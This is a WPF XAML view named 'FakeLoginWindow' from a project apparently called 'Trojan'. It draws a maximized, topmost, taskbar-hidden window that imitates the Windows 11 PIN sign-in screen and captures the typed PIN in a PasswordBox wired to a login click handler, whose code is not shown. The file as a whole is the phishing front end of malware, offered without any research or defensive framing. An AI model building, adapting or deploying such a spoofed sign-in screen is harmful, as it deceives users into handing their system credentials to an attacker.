<Window x:Class="Trojan.Views.FakeLoginWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        WindowStyle="None"
        WindowState="Maximized"
        ResizeMode="NoResize"
        Topmost="True"
        ShowInTaskbar="False"
        Background="Black">

    <Grid>

        <!-- Blur background -->
        <Grid>
            <Grid.Background>
                <ImageBrush ImageSource="/Assets/Slike/slikica.webp"
                            Stretch="Fill"/>
            </Grid.Background>

            <Rectangle Fill="#66000000"/>
            
        </Grid>

        <!-- Center content -->
        <StackPanel HorizontalAlignment="Center"
                    VerticalAlignment="Center">

            <!-- Avatar -->
            <Border Width="140"
                    Height="140"
                    CornerRadius="70"
                    Background="#E5E5E5"
                    HorizontalAlignment="Center">

                <Viewbox>

                    <Grid Width="80" Height="80">

                        <!-- head -->
                        <Ellipse Width="36"
                                 Height="36"
                                 Fill="#8A8A8A"
                                 VerticalAlignment="Top" Margin="22,6,22,0"/>

                        <!-- body -->
                        <Border Width="58"
                                Height="28"
                                Background="#8A8A8A"
                                CornerRadius="14"
                                VerticalAlignment="Top" Margin="11,46,11,0"/>
                    </Grid>

                </Viewbox>
            </Border>

            <!-- Username -->
            <TextBlock x:Name="UsernameText"
                       FontFamily="Segoe UI"
                       FontSize="34"
                       Foreground="White"
                       HorizontalAlignment="Center"
                       Margin="0,25,0,0"/>

            <!-- Windows 11 dots -->
            <Grid HorizontalAlignment="Center"
      Margin="0,12,0,0">

                <UniformGrid Rows="3"
                 Columns="3">

                    <Ellipse Width="4" Height="4" Fill="White" Margin="3"/>
                    <Ellipse Width="4" Height="4" Fill="White" Margin="3"/>
                    <Ellipse Width="4" Height="4" Fill="White" Margin="3"/>

                    <Ellipse Width="4" Height="4" Fill="White" Margin="3"/>
                    <Ellipse Width="4" Height="4" Fill="White" Margin="3"/>
                    <Ellipse Width="4" Height="4" Fill="White" Margin="3"/>

                    <Ellipse Width="4" Height="4" Fill="White" Margin="3"/>
                    <Ellipse Width="4" Height="4" Fill="White" Margin="3"/>
                    <Ellipse Width="4" Height="4" Fill="White" Margin="3"/>

                </UniformGrid>

            </Grid>

            <!-- PIN text -->
            <TextBlock Text="Enter your PIN"
                       FontFamily="Segoe UI"
                       FontSize="28"
                       Foreground="White"
                       HorizontalAlignment="Center"
                       Margin="0,15,0,0"/>

            <!-- PIN box -->
            <Border Width="320"
                Height="42"
                Background="#22000000"
                BorderBrush="#55FFFFFF"
                BorderThickness="1"
                Margin="0,25,0,0">

                <PasswordBox x:Name="password"
                 FontFamily="Segoe UI"
                 FontSize="18"
                 Foreground="White"
                 Background="Transparent"
                 BorderThickness="0"
                 CaretBrush="White"
                 Padding="12,6,12,6"
                 />
            </Border>

            <!-- forgot pin -->
            <TextBlock Text="I forgot my PIN"
                       FontFamily="Segoe UI"
                       FontSize="14"
                       Foreground="#DDFFFFFF"
                       HorizontalAlignment="Center"
                       Margin="0,20,0,0"/>

            <!-- signin options -->
            <TextBlock Text="Sign-in options"
                       FontFamily="Segoe UI"
                       FontSize="14"
                       Foreground="#DDFFFFFF"
                       HorizontalAlignment="Center"
                       Margin="0,25,0,0"/>

            <!-- buttons -->
            <StackPanel Orientation="Horizontal"
                        HorizontalAlignment="Center"
                        Margin="0,15,0,0">

                <Border Width="42"
                        Height="42"
                        Background="#334B6FFF"
                        BorderBrush="#55FFFFFF"
                        BorderThickness="1"
                        Margin="5">

                    <TextBlock Text="⌨"
                               FontSize="22"
                               Foreground="White"
                               HorizontalAlignment="Center"
                               VerticalAlignment="Center"/>
                </Border>

                <Button Width="42"
                    Height="42"
                    Click="LoginButton_Click"
                    Background="#55333333"
                    BorderBrush="#55FFFFFF"
                    BorderThickness="1"
                    Margin="5">
                    <TextBlock Text="➜"
                       FontSize="18"
                       Foreground="White"
                       HorizontalAlignment="Center"
                       VerticalAlignment="Center"/>


                    </Button>

            </StackPanel>

        </StackPanel>

    </Grid>
</Window>